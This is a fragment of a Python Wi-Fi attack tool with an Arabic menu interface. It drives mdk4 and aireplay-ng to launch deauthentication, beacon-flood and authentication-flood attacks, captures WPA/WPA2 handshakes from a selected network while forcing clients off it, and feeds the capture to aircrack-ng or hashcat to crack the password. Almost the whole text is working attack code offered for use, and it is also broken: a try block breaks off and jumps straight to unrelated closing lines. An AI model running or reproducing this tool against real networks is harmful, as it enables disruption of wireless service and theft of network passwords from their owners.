        print(f"{Colors.BRIGHT_YELLOW}[*] إعداد هجوم Deauth متقدم...{Colors.RESET}")
        
        # خيارات الهجوم
        print(f"\n{Colors.BRIGHT_WHITE}خيارات الهجوم:{Colors.RESET}")
        print(f"{Colors.BRIGHT_GREEN}[1]{Colors.RESET} هجوم Deauth عادي")
        print(f"{Colors.BRIGHT_GREEN}[2]{Colors.RESET} هجوم Deauth على عميل محدد")
        print(f"{Colors.BRIGHT_GREEN}[3]{Colors.RESET} هجوم Deauth مستمر")
        print(f"{Colors.BRIGHT_GREEN}[4]{Colors.RESET} هجوم Deauth مع تناوب القنوات")
        print(f"{Colors.BRIGHT_GREEN}[5]{Colors.RESET} هجوم Beacon Flood")
        print(f"{Colors.BRIGHT_GREEN}[6]{Colors.RESET} هجوم Authentication Flood")
        
        attack_type = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر نوع الهجوم (1-6): {Colors.RESET}").strip()
        
        if attack_type == "1":
            self.deauth_normal()
        elif attack_type == "2":
            self.deauth_specific_client()
        elif attack_type == "3":
            self.deauth_continuous()
        elif attack_type == "4":
            self.deauth_channel_hopping()
        elif attack_type == "5":
            self.beacon_flood()
        elif attack_type == "6":
            self.auth_flood()
    
    def deauth_normal(self):
        """هجوم Deauth عادي"""
        try:
            print(f"{Colors.BRIGHT_YELLOW}[*] بدء هجوم Deauth...{Colors.RESET}")
            
            # استخدام mdk4 للهجوم الأقوى
            cmd = [
                'mdk4', self.monitor_interface, 'd',
                '-b', self.current_target['bssid'],
                '-c', self.current_target['channel']
            ]
            
            print(f"{Colors.BRIGHT_CYAN}[*] الأمر: {' '.join(cmd)}{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*] اضغط Ctrl+C لإيقاف الهجوم{Colors.RESET}")
            
            process = subprocess.Popen(cmd)
            
            # انتظار الإيقاف
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                print(f"\n{Colors.BRIGHT_YELLOW}[*] تم إيقاف الهجوم{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def capture_handshake_advanced(self):
        """اعتراض مصافحة WPA/WPA2 متقدم"""
        if not self.current_target:
            print(f"{Colors.BRIGHT_RED}[✗] لم يتم اختيار هدف{Colors.RESET}")
            return
        
        print(f"{Colors.BRIGHT_YELLOW}[*] إعداد اعتراض مصافحة WPA/WPA2...{Colors.RESET}")
        
        # اسم ملف الإخراج
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"handshakes/handshake_{self.current_target['bssid'].replace(':', '')}_{timestamp}"
        
        try:
            # تشغيل airodump-ng لاعتراض المصافحة
            cmd1 = [
                'airodump-ng',
                '--bssid', self.current_target['bssid'],
                '--channel', self.current_target['channel'],
                '--write', output_file,
                '--output-format', 'cap',
                self.monitor_interface
            ]
            
            print(f"{Colors.BRIGHT_CYAN}[*] الأمر: {' '.join(cmd1)}{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*] ابدأ هجوم deauth في نافذة أخرى{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*] اضغط Ctrl+C عند رؤية WPA handshake{Colors.RESET}")
            
            # تشغيل في خيط منفصل
            capture_thread = threading.Thread(target=self.run_capture, args=(cmd1, output_file))
            capture_thread.start()
            
            # بدء هجوم deauth تلقائي
            deauth_thread = threading.Thread(target=self.run_deauth_for_handshake)
            deauth_thread.start()
            
            # انتظار الإكمال
            capture_thread.join()
            deauth_thread.join()
            
            # التحقق من وجود المصافحة
            if self.verify_handshake(f"{output_file}-01.cap"):
                print(f"{Colors.BRIGHT_GREEN}[✓] تم اعتراض مصافحة WPA بنجاح{Colors.RESET}")
                print(f"{Colors.BRIGHT_GREEN}[✓] الملف: {output_file}-01.cap{Colors.RESET}")
                
                # عرض خيارات كسر كلمة المرور
                self.crack_handshake_menu(f"{output_file}-01.cap")
            else:
                print(f"{Colors.BRIGHT_RED}[✗] لم يتم اعتراض مصافحة{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.BRIGHT_YELLOW}[*] تم إيقاف الاعتراض{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ: {e}{Colors.RESET}")
        
        input(f"\n{Colors.BRIGHT_BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
    
    def run_capture(self, cmd, output_file):
        """تشغيل أمر الاعتراض"""
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # قراءة الإخراج في الوقت الحقيقي
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    print(f"{Colors.BRIGHT_CYAN}[CAP]{Colors.RESET} {line.strip()}")
                    
                    # التحقق من ظهور المصافحة
                    if "WPA handshake" in line:
                        print(f"{Colors.BRIGHT_GREEN}[✓] تم اكتشاف مصافحة WPA!{Colors.RESET}")
                        process.terminate()
                        break
            
            process.wait()
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في الاعتراض: {e}{Colors.RESET}")
    
    def run_deauth_for_handshake(self):
        """تشغيل هجوم deauth لاعتراض المصافحة"""
        try:
            # انتظر قليلاً قبل البدء
            time.sleep(5)
            
            # البحث عن عملاء الشبكة
            clients = [c for c in self.clients if c['bssid'] == self.current_target['bssid']]
            
            if clients:
                # هجوم على جميع العملاء
                for client in clients[:3]:  # أول 3 عملاء فقط
                    cmd = [
                        'aireplay-ng',
                        '--deauth', '10',
                        '-a', self.current_target['bssid'],
                        '-c', client['mac'],
                        self.monitor_interface
                    ]
                    
                    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(2)
            else:
                # هجوم بث على العنوان العام
                cmd = [
                    'aireplay-ng',
                    '--deauth', '20',
                    '-a', self.current_target['bssid'],
                    self.monitor_interface
                ]
                
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في هجوم deauth: {e}{Colors.RESET}")
    
    def verify_handshake(self, cap_file):
        """التحقق من وجود مصافحة في ملف CAP"""
        try:
            cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            return "WPA (1 handshake)" in result.stdout
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}[✗] خطأ في التحقق: {e}{Colors.RESET}")
            return False
    
    def crack_handshake_menu(self, cap_file):
        """قائمة كسر كلمة المرور"""
        print(f"\n{Colors.BRIGHT_CYAN}{Colors.BOLD}كسر كلمة مرور WPA:{Colors.RESET}")
        
        while True:
            print(f"\n{Colors.BRIGHT_WHITE}خيارات الكسر:{Colors.RESET}")
            print(f"{Colors.BRIGHT_GREEN}[1]{Colors.RESET} استخدام aircrack-ng (CPU)")
            print(f"{Colors.BRIGHT_GREEN}[2]{Colors.RESET} استخدام hashcat (GPU)")
            print(f"{Colors.BRIGHT_GREEN}[3]{Colors.RESET} استخدام John the Ripper")
            print(f"{Colors.BRIGHT_GREEN}[4]{Colors.RESET} هجوم القاموس")
            print(f"{Colors.BRIGHT_GREEN}[5]{Colors.RESET} هجوم القوة الغاشمة")
            print(f"{Colors.BRIGHT_GREEN}[6]{Colors.RESET} هجوم القاعدة المطرية")
            print(f"{Colors.BRIGHT_GREEN}[7]{Colors.RESET} كسر باستخدام قواعد التوليد")
            print(f"{Colors.BRIGHT_GREEN}[8]{Colors.RESET} العودة")
            
            choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر طريقة الكسر (1-8): {Colors.RESET}").strip()
            
            if choice == "1":
                self.crack_with_aircrack(cap_file)
            elif choice == "2":
                self.crack_with_hashcat(cap_file)
            elif choice == "8":
                break
            else:
                print(f"{Colors.BRIGHT_YELLOW}[*] الخيار قيد التطوير{Colors.RESET}")
                time.sleep(1)
    
    def crack_with_aircrack(self, cap_file):
        """كسر باستخدام aircrack-ng"""
        print(f"{Colors.BRIGHT_YELLOW}[*] إعداد كسر كلمة المرور باستخدام aircrack-ng...{Colors.RESET}")
        
        # اختيار wordlist
        wordlists = self.list_wordlists()
        
        if not wordlists:
            print(f"{Colors.BRIGHT_RED}[✗] لم أجد wordlists{Colors.RESET}")
            return
        
        print(f"\n{Colors.BRIGHT_WHITE}Wordlists المتاحة:{Colors.RESET}")
        for i, wl in enumerate(wordlists[:10], 1):
            print(f"{Colors.BRIGHT_GREEN}[{i}]{Colors.RESET} {wl}")
        
        choice = input(f"\n{Colors.BRIGHT_BLUE}[?] اختر wordlist (1-{min(10, len(wordlists))}): {Colors.RESET}").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= min(10, len(wordlists)):
            wordlist = wordlists[int(choice) - 1]
            
            print(f"{Colors.BRIGHT_YELLOW}[*] بدء الكسر... قد يستغرق وقتاً طويلاً{Colors.RESET}")
            
            try:
                cmd = [
                    'aircrack-ng',
                    cap_file,
                    '-w', wordlist,
                    '-l', f"results/{os.path.basename(cap_file)}_password.txt"
                ]
                
                print(f"{Colors.BRIGHT_CYAN}[*] الأمر: {' '.join(cmd)}{Colors.RESET}")
                
                # تشغيل في خيط منفصل
                crack_thread = threading.Thread(target=self.run_cracking, args=(cmd,))
                crack_thread.start()
                
                crack_thread.join()
                


        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
